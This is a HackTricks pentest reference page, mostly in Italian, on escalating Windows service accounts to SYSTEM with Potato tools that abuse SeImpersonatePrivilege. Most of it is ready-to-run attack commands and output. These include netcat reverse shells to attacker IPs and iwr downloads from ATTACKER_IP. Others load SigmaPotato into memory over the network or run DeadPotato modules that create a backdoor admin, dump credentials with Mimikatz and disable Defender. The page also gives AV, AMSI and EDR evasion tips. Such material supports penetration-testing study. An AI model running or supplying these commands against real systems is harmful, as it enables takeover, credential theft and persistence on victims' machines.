# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 e successivi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** possono essere usati per ottenere gli stessi privilegi e acquisire accesso a livello `NT AUTHORITY\SYSTEM`. Questo [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) approfondisce lo strumento `PrintSpoofer`, che può essere usato per abusare dei privilegi di impersonation su host Windows 10 e Server 2019 dove JuicyPotato non funziona più.

> [!TIP]
> Un'alternativa moderna frequentemente mantenuta nel 2024–2025 è SigmaPotato (un fork di GodPotato) che aggiunge l'uso in-memory/.NET reflection e supporto esteso per gli OS. Vedi l'uso rapido qui sotto e il repo in References.

Pagine correlate per contesto e tecniche manuali:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisiti e problemi comuni

Tutte le seguenti tecniche si basano sull'abuso di un servizio privilegiato capace di impersonation da un contesto che detiene uno dei seguenti privilegi:

- SeImpersonatePrivilege (la più comune) o SeAssignPrimaryTokenPrivilege
- L'integrità elevata (high integrity) non è richiesta se il token possiede già SeImpersonatePrivilege (tipico per molti account di servizio come IIS AppPool, MSSQL, ecc.)

Verifica rapidamente i privilegi:
```cmd
whoami /priv | findstr /i impersonate
```
Note operative:

- Se la tua shell gira con un token ristretto privo di SeImpersonatePrivilege (comune per Local Service/Network Service in alcuni contesti), ripristina i privilegi predefiniti dell'account usando FullPowers, poi esegui un Potato. Esempio: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer richiede il servizio Print Spooler in esecuzione e raggiungibile tramite l'endpoint RPC locale (spoolss). In ambienti fortemente protetti dove Spooler è disabilitato dopo PrintNightmare, preferisci RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato richiede un OXID resolver raggiungibile su TCP/135. Se l'egress è bloccato, usa un redirector/port-forwarder (vedi esempio sotto). Le build più vecchie richiedevano il flag -f.
- EfsPotato/SharpEfsPotato abusano di MS-EFSR; se un pipe è bloccato, prova pipe alternativi (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 durante RpcBindingSetAuthInfo tipicamente indica un servizio di autenticazione RPC sconosciuto/non supportato; prova un pipe/transport diverso o assicurati che il servizio target sia in esecuzione.
- Fork "kitchen-sink" come DeadPotato includono moduli payload extra (Mimikatz/SharpHound/Defender off) che scrivono su disco; aspettati una rilevazione EDR più alta rispetto agli originali snelli.

## Dimostrazione rapida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Note:
- Puoi usare -i per avviare un processo interattivo nella console corrente, oppure -c per eseguire un one-liner.
- Richiede Spooler service. Se disabilitato, questo fallirà.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se outbound 135 è bloccato, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato è una nuova primitive di abuso COM rilasciata alla fine del 2022 che prende di mira il servizio **PrintNotify** invece di Spooler/BITS. Il binario istanzia il server COM PrintNotify, inserisce un falso `IUnknown`, quindi innesca una callback privilegiata tramite `CreatePointerMoniker`. Quando il servizio PrintNotify (in esecuzione come **SYSTEM**) si riconnette, il processo duplica il token restituito e avvia il payload fornito con privilegi completi.

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Richiede che il contesto chiamante possieda **SeImpersonatePrivilege** (tipico per IIS APPPOOL, MSSQL e account di servizio di scheduled-task).
* Accetta sia un comando diretto sia una modalità interattiva per restare nella console originale. Esempio:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Poiché è interamente basato su COM, non sono necessari listener named-pipe o redirector esterni, rendendolo un sostituto plug-and-play sugli host dove Defender blocca il binding RPC di RoguePotato.

Operatori come Ink Dragon eseguono PrintNotifyPotato immediatamente dopo aver ottenuto ViewState RCE su SharePoint per pivotare dal worker `w3wp.exe` a SYSTEM prima di installare ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Suggerimento: Se una pipe fallisce o l'EDR la blocca, prova le altre pipe supportate:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
- Funziona su Windows 8/8.1–11 e Server 2012–2022 quando SeImpersonatePrivilege è presente.
- Prendi il binary che corrisponde al runtime installato (es., `GodPotato-NET4.exe` su Server 2022 moderno).
- Se la tua execution primitive iniziale è una webshell/UI con timeout brevi, stage il payload come uno script e chiedi a GodPotato di eseguirlo invece di un lungo inline command.

Esempio rapido di staging da un webroot IIS scrivibile:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornisce due varianti che prendono di mira gli oggetti DCOM dei servizi che per impostazione predefinita usano RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa i binaries forniti ed esegui il tuo comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork aggiornato di GodPotato)

SigmaPotato aggiunge migliorie moderne come in-memory execution via .NET reflection e un helper PowerShell per reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Vantaggi aggiuntivi nelle build 2024–2025 (v1.2.x):
- Flag per reverse shell integrato `--revshell` e rimozione del limite di 1024 caratteri di PowerShell così puoi lanciare payload lunghi che bypassano AMSI in un'unica soluzione.
- Sintassi compatibile con reflection (`[SigmaPotato]::Main()`), più un rudimentale trucco di evasione AV via `VirtualAllocExNuma()` per ingannare semplici euristiche.
- Separato `SigmaPotatoCore.exe` compilato contro .NET 2.0 per ambienti PowerShell Core.

### DeadPotato (rifacimento GodPotato 2024 con moduli)

DeadPotato mantiene la catena di impersonation OXID/DCOM di GodPotato ma integra helper di post-exploitation in modo che gli operatori possano immediatamente ottenere SYSTEM ed eseguire persistence/collection senza strumenti aggiuntivi.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — avvia un comando arbitrario come SYSTEM.
- `-rev <ip:port>` — quick reverse shell.
- `-newadmin user:pass` — crea un amministratore locale per persistence.
- `-mimi sam|lsa|all` — scrive ed esegue Mimikatz per estrarre le credenziali (scrive su disco, rumoroso).
- `-sharphound` — esegue la raccolta SharpHound come SYSTEM.
- `-defender off` — disabilita la protezione in tempo reale di Defender (molto rumoroso).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Poiché include binari aggiuntivi, aspettati più rilevamenti da AV/EDR; usa il più snello GodPotato/SigmaPotato quando la furtività è importante.

## Riferimenti

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
